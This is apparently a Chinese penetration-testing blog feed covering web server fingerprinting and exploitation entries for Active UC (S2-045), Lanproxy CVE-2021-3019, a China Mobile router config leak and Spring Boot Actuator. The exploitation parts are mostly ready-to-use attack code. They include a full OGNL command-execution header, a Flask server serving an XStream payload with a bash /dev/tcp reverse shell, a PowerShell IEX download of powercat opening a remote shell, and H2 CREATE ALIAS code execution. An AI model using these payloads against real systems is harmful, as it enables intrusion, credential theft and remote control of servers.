<p>但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h2><p>Jetty是一种开源的servlet容器，它为基于Java的网络内容，如JSP和servlet提供运行环境。</p>
<h2 id="Kangle"><a href="#Kangle" class="headerlink" title="Kangle"></a>Kangle</h2><p>kangle web服务器（简称：kangle）是一款跨平台、功能强大、安全稳定、易操作的高性能web服务器和反向代理服务器软件。</p>
<p>kangle也是一款专为做虚拟主机研发的web服务器。实现虚拟主机独立进程、独立身份运行。</p>
<p>用户之间安全隔离，一个用户出问题不影响其他用户。安全支持php、asp、asp·net、java、ruby等多种动态开发语言。</p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx不仅是一个小巧且高效的HTTP服务器，也可以做一个高效的负载均衡反向代理</p>
<p>通过它接受用户的请求并分发到多个Mongrel进程可以极大提高Rails应用的并发能力。</p>
<p>支持通用语言接口，如php、python、perl等</p>
<p>支持正向和反向代理、虚拟主机、url重写、压缩传输等</p>
<p> nginx的模块都是静态编译的，对fcgi的支持非常好，在处理链接的的方式上nginx支持epoll</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Tomcat运行servlet和JSP Web应用软件的基于Java的Web应用软件容器</p>
<p>Tomcat Server是根据servlet和JSP规范进行执行的</p>
<p>Tomcat是Apache软件基金会（ApacheSoftwareFoundation）的Jakarta项目中的一个核心项目，由Apache、Sun和其他一些公司及个人共同开发而成。</p>
<h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tomcat</span><br></pre></td></tr></table></figure>

<p><strong>基于404报错</strong></p>
<p>构造一个不存在的资源<br>URL/456sadaw.741<br>在源代码中包含如下代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h2><p>Web服务器是一种多功能、基于标准的 Web应用服务器。</p>
<p>各种应用开发、部署所有关键性的任务，无论是集成各种系统和数据库，还是提交服务、跨 Internet 协作，起始点都是 BEA WebLogic Server。</p>
<p>由于它具有全面的功能、对开放标准的遵从性、多层架构、支持基于组件的开发，基于 Internet 的企业都选择它来开发、部署最佳的应用。</p>
<h2 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h2><p>作为一台功能完善的开放 Web应用服务器， 是 IBM电子商务项目的核心部分，它为因特网和内网 Web应用建立、部署和管理 Java应用环境。</p>
<h2 id="BEAWeblogic"><a href="#BEAWeblogic" class="headerlink" title="BEAWeblogic"></a>BEAWeblogic</h2><p>BEAWebLogic是一个 Java应用服务器，用于开发、集成、部署和管理大型分布式 Web、网络和数据库应用程序。</p>
<h2 id="Lighttpd"><a href="#Lighttpd" class="headerlink" title="Lighttpd"></a>Lighttpd</h2><p>Lighttpd是由德国人JanKneschke领导开发的，基于BSD许可的开源WEB服务器软件。</p>
<p>其根本的目的是提供一个专门针对高性能网站，安全、快速、兼容性好并且灵活的webserver环境。</p>
<p>具有非常低的内存开销，CPU占用率低，效能好，以及丰富的模块等特点。</p>
<p>支持FastCGI,CGI,Auth,输出压缩(outputcompress),URL重写,Alias等重要功能。</p>
<h2 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>Resin是Caucho公司的产品，是一个非常流行的支持Servlet和JSP的服务器，速度非常快。</p>
<p>Resin的一种先进的语言XSL(XML stylesheet language)可以使得形式和内容相分离，支持EJB。</p>
<p>Resin本身包含了一个支持HTML的Web服务器，这使它不仅可以显示动态内容，而且显示静态内容的能力也毫不逊色。</p>
<h2 id="Sun"><a href="#Sun" class="headerlink" title="Sun"></a>Sun</h2><p>sun的 Java系统 Web服务器，即 sun ONE Web Server。大多数情况下是在运行 Sun公司的 Solaris操作系统的任务级 Web服务器上。</p>
<p>Sun Web Server包括ava™Servlet 2.3和JavaServer Pages™（JSP™）1.2规范的Java™2平台，企业版（J2EE™）兼容实现。符合J2EE的Web容器提供了设计和部署符合Java™技术标准的Web应用程序所需的灵活性和可靠性。</p>
<p>Sun是基于开放标准构建的多进程，多线程，安全的Web服务器</p>
<h2 id="Zeus"><a href="#Zeus" class="headerlink" title="Zeus"></a>Zeus</h2><p>Zeus是一个运行于Unix下的非常优秀的Web服务器，是效率最高的Web服务器之一。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Active UC index.action远程命令执行漏洞</title>
    <url>//20f03e999316.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/acenter/index.action</span><br></pre></td></tr></table></figure>

<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /acenter/index.action HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;netstat -an&#x27; ).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web应用漏洞</category>
        <category>Active-UC</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Lanproxy任意文件读取-CVE-2021-3019</title>
    <url>//35ae20fe9202.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header= &quot;Server: LPS-0.1&quot;</span><br></pre></td></tr></table></figure>



<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://file.nioee.com/d/2e81550ebdbd416c933f/">https://file.nioee.com/d/2e81550ebdbd416c933f/</a></p>
<p>只下载服务端<a href="https://file.nioee.com/d/2e81550ebdbd416c933f/files/?p=/proxy-server-0.1.zip">proxy-server-0.1.zip</a></p>
<p>配置文件地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../conf/config.properties</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../bin/startup.bat</span><br><span class="line">../bin/startup.sh</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问服务页面管理地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8090</span><br></pre></td></tr></table></figure>

<p>当前页面抓包，访问路径<code>../conf/config.properties</code>(直接访问会报404错)</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5vkomujlj611f0badlf02.jpg" alt="Lanproxy目录遍历漏洞.png"></p>
<h3 id="POC下载"><a href="#POC下载" class="headerlink" title="POC下载"></a>POC下载</h3><p><a href="https://github.com/FanqXu/CVE-2021-3019">https://github.com/FanqXu/CVE-2021-3019</a></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>下载官方补丁</p>
<p><a href="https://github.com/ffay/lanproxy/commits/master">https://github.com/ffay/lanproxy/commits/master</a></p>
<p><a href="https://github.com/hailinz/lanproxy">https://github.com/hailinz/lanproxy</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web应用漏洞</category>
        <category>Lanproxy</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
        <tag>目录遍历</tag>
      </tags>
  </entry>
  <entry>
    <title>中国移动-禹路由 ExportSettings.sh 敏感信息泄露漏</title>
    <url>//f0a3ef61fe99.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>中国移动 禹路由 <code>ExportSettings.sh</code> 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;互联世界 物联未来-登录&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cgi-bin/ExportSettings.sh</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5pozofyvj612v0e00y402.jpg" alt="中国移动禹路由敏感信息泄露漏洞.png"></p>
<p>存在账号密码等敏感信息</p>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><p>禁止外部访问<code>ExportSettings.sh</code>文件</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>网络设备漏洞</category>
        <category>中国移动</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot Autuator未授权访问</title>
    <url>//a45b2452a531.html</url>
    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>​        Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限</p>
<p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合</p>
<p>组件版本的相互依赖关系：</p>
<table>
<thead>
<tr>
<th align="center">依赖项</th>
<th align="center">版本列表及依赖组件版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">spring-boot-starter-parent</td>
<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td>
</tr>
<tr>
<td align="center">spring-boot-dependencies</td>
<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td>
</tr>
<tr>
<td align="center">spring-cloud-dependencies</td>
<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td>
</tr>
</tbody></table>
<p>Spring Cloud 与 Spring Boot 版本之间的依赖关系：</p>
<table>
<thead>
<tr>
<th align="center">Spring Cloud 大版本</th>
<th align="center">Spring Boot 版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Angel</td>
<td align="center">兼容 Spring Boot 1.2.x</td>
</tr>
<tr>
<td align="center">Brixton</td>
<td align="center">兼容 Spring Boot 1.3.x、1.4.x</td>
</tr>
<tr>
<td align="center">Camden</td>
<td align="center">兼容 Spring Boot 1.4.x、1.5.x</td>
</tr>
<tr>
<td align="center">Dalston</td>
<td align="center">兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
</tr>
<tr>
<td align="center">Edgware</td>
<td align="center">兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
</tr>
<tr>
<td align="center">Finchley</td>
<td align="center">兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
</tr>
<tr>
<td align="center">Greenwich</td>
<td align="center">兼容 Spring Boot 2.1.x</td>
</tr>
<tr>
<td align="center">Hoxton</td>
<td align="center">兼容 Spring Boot 2.2.x</td>
</tr>
</tbody></table>
<p>Spring Cloud 小版本号的后缀及含义:</p>
<table>
<thead>
<tr>
<th align="center">小版本号后缀</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">BUILD-SNAPSHOT</td>
<td align="center">快照版，代码不是固定，处于变化之中</td>
</tr>
<tr>
<td align="center">MX</td>
<td align="center">里程碑版</td>
</tr>
<tr>
<td align="center">RCX</td>
<td align="center">候选发布版</td>
</tr>
<tr>
<td align="center">RELEASE</td>
<td align="center">正式发布版</td>
</tr>
<tr>
<td align="center">SRX</td>
<td align="center">(修复错误和 bug 并再次发布的)正式发布版</td>
</tr>
</tbody></table>
<h3 id="服务特征"><a href="#服务特征" class="headerlink" title="服务特征"></a>服务特征</h3><p><strong>Spring Boot</strong></p>
<p>1.网站图片是一个绿色的树叶</p>
<p>2.报错信息</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsyyj2zpn7j60m805rmzu02.jpg" alt="Spring Boot识别.png"></p>
<p><strong>Actuator</strong> </p>
<p>Spring Boot 1.x 版本在跟目录下注册</p>
<p>Spring Boot 2.x版本端点移动到<code>/actuator/</code>路径</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>访问如下路径，敏感页面可直接访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/autoconfig - 显示自动配置报告</span><br><span class="line">/configprops - 显示配置属性</span><br><span class="line">/beans - 显示Spring Beans的完整列表</span><br><span class="line">/dump - 显示线程转储（包括堆栈跟踪）</span><br><span class="line">/env - 提供对配置环境的访问</span><br><span class="line">/health - 显示应用程序的健康指标</span><br><span class="line">/info - 显示应用信息</span><br><span class="line">/logfile - 输出日志文件的内容</span><br><span class="line">/mappings - 显示所有MVC控制器映射</span><br><span class="line">/metrics - 显示当前应用的’指标’信息</span><br><span class="line">/restart - 重新启动应用程序</span><br><span class="line">/shutdown - 关闭应用程序</span><br><span class="line">/trace - 显示最后几条HTTP消息（可能包含会话标识符）</span><br><span class="line">/jolokia/list - 存在logback组件，可执行远程代码</span><br></pre></td></tr></table></figure>



<h3 id="restart"><a href="#restart" class="headerlink" title="/restart"></a>/restart</h3><p>导致应用重启，影响业务正常运行</p>
<h3 id="shutdown"><a href="#shutdown" class="headerlink" title="/shutdown"></a>/shutdown</h3><p>导致应用关闭，影响业务正常运行</p>
<h3 id="env"><a href="#env" class="headerlink" title="/env"></a>/env</h3><p>环境信息泄露，可能存在数据库账号密码</p>
<p>存在软件的版本信息和绝对路径</p>
<p>查看是否存在常见的反序列化 gadget 依赖，比如 commons-collections、 Jdk7u21、 Jdk8u20 等</p>
<h4 id="spring-Cloud-env"><a href="#spring-Cloud-env" class="headerlink" title="spring Cloud env"></a>spring Cloud env</h4><p>当spring boot使用Spring Cloud 相关组件时，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE</p>
<p><strong>利用范围</strong></p>
<ul>
<li>Spring Boot 2.x 无法利用成功</li>
<li>Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功</li>
<li>Spring Boot &lt;= 1.4 可利用成功</li>
</ul>
<p>下载EXP</p>
<p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>将下载后的文件编译,然后把生成的jar文件上传到公网web服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>

<p>利用 /env endpoint 修改 spring.cloud.bootstrap.location 属性值为外部 yml 配置文件 url 地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"> </span><br><span class="line">spring.cloud.bootstrap.location=http://x.x.x.x/yaml-payload.yml</span><br></pre></td></tr></table></figure>

<p>在通过/refresh 接口触发</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>



<h4 id="XStream反序列化"><a href="#XStream反序列化" class="headerlink" title="XStream反序列化"></a>XStream反序列化</h4><p>影响范围</p>
<ul>
<li>Eureka-Client &lt;1.8.7</li>
</ul>
<p>查看/env端点是否存在<code>eureka.client.serviceUrl.defaultZone</code>属性</p>
<p>通过/env将<code>eureka.client.serviceUrl.defaultZone</code>属性设置为服务器URL，然后调用/refresh端点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1</span></span><br><span class="line"><span class="comment"># windows反弹shell</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powershell&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                                &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/88.88.88.88/3333 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">2222</span>)</span><br></pre></td></tr></table></figure>

<p>使用python在公网web服务器执行以上代码</p>
<p>spring 1.x（一定要指定内容类型，不能有其他类型）</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/json</span><br></pre></td></tr></table></figure>



<p>通过/env端点设置<code>eureka.client.serviceUrl.defaultZone</code>属性</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50</span><br><span class="line"> </span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://x.x.x.x/xstream</span><br></pre></td></tr></table></figure>

<p>访问/refresh端点刷新配置</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>



<h4 id="H2-REC"><a href="#H2-REC" class="headerlink" title="H2 REC"></a>H2 REC</h4><p>影响版本</p>
<ul>
<li>Spring Boot 2.x版本</li>
</ul>
<p>发送POST包配置<code>spring.datasource.hikari.connection-test-query</code>的值</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xx.xx.xx.xx:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json"><span class="attr">&quot;name&quot;</span>:<span class="string">&quot;spring.datasource.hikari.connection-test-query&quot;</span>,<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;; CALL EXEC(&#x27;ipconfig&amp;&amp;ifconfig&#x27;);&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问/refresh端点刷新配置</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/restart</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xx.xx.xx.xx:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>



